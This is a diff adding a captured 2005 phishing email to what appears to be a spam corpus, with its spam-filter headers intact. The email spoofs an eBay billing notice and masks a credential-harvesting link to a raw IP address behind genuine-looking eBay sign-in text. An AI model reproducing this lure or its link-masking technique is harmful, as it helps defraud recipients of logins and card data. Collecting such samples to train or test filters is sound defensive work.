@@ -1,0 +1,100 @@
+Return-Path: <anonymous@localhost.mail>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+	by naughty.example.com (Postfix) with ESMTP id B3EBD537056
+	for <nobody@login.example.com>; Mon, 19 Dec 2005 08:58:52 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+	by mail2.example.com (Postfix) with ESMTP id BDAF56FA22B
+	for <nobody@example.com>; Mon, 19 Dec 2005 08:58:50 -0500 (EST)
+Received: from localhost (113.Red-213-98-183.staticIP.rima-tde.net [213.98.183.113])
+	by mail2.example.com (Postfix) with ESMTP
+	for <nobody@example.com>; Mon, 19 Dec 2005 08:58:50 -0500 (EST)
+Received: (qmail 19273 invoked by uid 0); 17 Dec 2005 00:43:27 -0000
+Date: 17 Dec 2005 00:43:27 -0000
+To: nobody@example.com
+Subject: Place or Update Credit Card on File 
+Message-ID: <1134780207.68261.qmail@ebay.com>
+From: "eBay Billing Department" <aw-confirm@ebay.com>
+Content-Type: text/html
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ***
+X-Spam-Status: No, score=3.8 required=5.0 tests=HTML_FONT_BIG,
+	HTML_FONT_FACE_BAD,HTML_MESSAGE,HTML_MIME_NO_HTML_TAG,
+	HTML_TAG_EXIST_TBODY,MIME_HEADER_CTYPE_ONLY,MIME_HTML_ONLY,
+	NORMAL_HTTP_TO_IP,RCVD_IN_XBL autolearn=no version=3.0.2
+X-Spam-Report: 
+	*  0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address in URL
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.0 HTML_FONT_FACE_BAD BODY: HTML font face is not a word
+	*  0.1 HTML_FONT_BIG BODY: HTML tag for a big font size
+	*  0.1 HTML_TAG_EXIST_TBODY BODY: HTML has "tbody" tag
+	*  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  3.1 RCVD_IN_XBL RBL: Received via a relay in Spamhaus XBL
+	*      [213.98.183.113 listed in sbl-xbl.spamhaus.org]
+	*  0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME headers
+	*  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 155
+
+<HEAD>
+<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
+<BODY><DIV align=center>
+<TABLE cellSpacing=0 cellPadding=2 width="100%" align=center border=0>
+<TBODY>
+<TR>
+<TD><FONT face="Verdana, sans-serif" color=#666666 size=1><B>eBay treats your personal information with utmost care.</B><BR>This eBay notice was sent to&nbsp;you based on your eBay account preferences and in accordance with our <A title=http://pages.ebay.com/help/community/png-priv.html href="http://pages.ebay.com/help/community/png-priv.html" target=_blank onfiltered="return openNonHelpWindow(this.href);"><FONT color=#003399>Privacy Policy</FONT></A>.</FONT></TD></TR></TBODY></TABLE></DIV>
+<DIV align=center>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" align=center bgColor=white border=0>
+<TBODY>
+<TR>
+<TD noWrap width="1%"><IMG src="http://pics.ebaystatic.com/aw/pics/fr/email/syiSessions/hdrLeft_13x39.gif"></TD>
+<TD noWrap width="98%" background=http://pics.ebaystatic.com/aw/pics/fr/email/syiSessions/imgSpan_5x39.gif><FONT face="arial, sans-serif" size=4><FONT style="FONT-WEIGHT: bold; FONT-SIZE: small; FONT-FAMILY: arial, sans-serif">Place or Update Credit Card On File</FONT></FONT></TD>
+<TD vAlign=bottom noWrap width="1%"><IMG src="http://pics.ebaystatic.com/aw/pics/fr/email/syiSessions/hdrRight_90x39.gif"></TD></TR></TBODY></TABLE></DIV>
+<DIV align=center>
+<TABLE cellSpacing=0 cellPadding=2 width="100%" align=center bgColor=#ececf7 border=0>
+<TBODY>
+<TR>
+<TD></TD>
+<TD>
+<P><FONT face="Arial, Helvetica, sans-serif   " size=-1><STRONG>Dear eBay user</STRONG>,<BR><BR>During our regularly schedule account maintenance and verification we have detected a slight error in your billing information on file with eBay. This might be due to either following reasons:<BR></FONT></P><FONT face="Arial, Helvetica, sans-serif   " size=-1></FONT>
+<P><FONT face="Arial, Helvetica, sans-serif   " size=-1><FONT face=arial>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- A recent change in your personal information (i.e. change of address)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- Submitting invalid information during the initial sign up process.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;An inability to accurately verify your selected option of payment due an internal error within<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; our&nbsp;processors.</FONT></FONT></P>
+<P><FONT size=2><FONT face=Arial>Please sign in to your eBay account and update your billing information:</FONT><IMG height=20 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1 border=0><BR></FONT><IMG height=20 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1 border=0><BR>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD width=19></TD>
+<TD><U><FONT color=#0000ff><A title=http://signin.ebay.com/eBayISAPI.dll?SignIn&ssPageName=h:h:sin:US onclick="return ShowLinkWarning()" href="http://213.98.183.113/error/ebay/index.php" target=_blank onfiltered="window.status = 'Done';"><FONT color=#003399><STRONG>http://signin.ebay.com/eBayISAPI.dll?SignIn&ssPageName=h:h:sin:US</STRONG> <FONT face=arial size=2></FONT></FONT></A><FONT color=#003399></FONT></FONT></U></TD></TR></TBODY></TABLE></P>
+<P><FONT size=2><FONT face=Arial>If your account information is not update, your ability to sell or bid on eBay will become restricted.<BR><FONT size=2><FONT face="Arial, Helvetica,&#13;&#10;sans-serif   "></FONT></FONT></P>
+<P><FONT size=2><FONT face=Arial><FONT size=2>Thank you,<BR>eBay Billing Department</FONT><BR></FONT></FONT><BR></FONT></FONT></P></TD></TR>
+<TR>
+<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD></TR></TBODY></TABLE></DIV>
+<DIV align=center>
+<TABLE cellSpacing=2 cellPadding=0 width="100%" align=center>
+<TBODY>
+<TR bgColor=#c6c6c6 height=1>
+<TD><IMG height=1 src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width=1 border=0></TD></TR></TBODY></TABLE></DIV>
+<TABLE cellSpacing=0 cellPadding=0 width=600>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" width=600>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD width=19>
+<P align=center>&nbsp;</P></TD>
+<TD><FONT face=Arial size=-1>
+<P align=center><FONT color=#666666>Visit our <A href="javascript:ol('http://pages.ebay.com/help/policies/privacy-policy.html?ssPageName%3dADME:X:LC:US:16');">Privacy Policy</A> and <A href="javascript:ol('http://pages.ebay.com/help/policies/user-agreement.html?ssPageName%3dADME:X:LC:US:15');">User Agreement</A> if you have any questions.<BR><BR>Protect yourself from Spoof (fake) e-mails. <A href="javascript:ol('http://pages.ebay.com/education/spooftutorial');">Learn More</A></FONT> </P>
+<P align=center>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+<TBODY>
+<TR>
+<TD>
+<P align=center><FONT face=Arial color=#666666 size=1>Copyright © 1995-2005 eBay Inc. All Rights Reserved. <BR>Designated trademarks and brands are the property of their respective owners.<BR>eBay and the eBay logo are trademarks of eBay Inc.</FONT> </P></TD></TR></TBODY></TABLE></P></FONT></TD></TR></TBODY></TABLE>
+<DIV align=center>
+<TABLE align=center>
+<TBODY>
+<TR></TD></TR></TBODY></TABLE></DIV></TR></TBODY></TABLE></BODY>
+
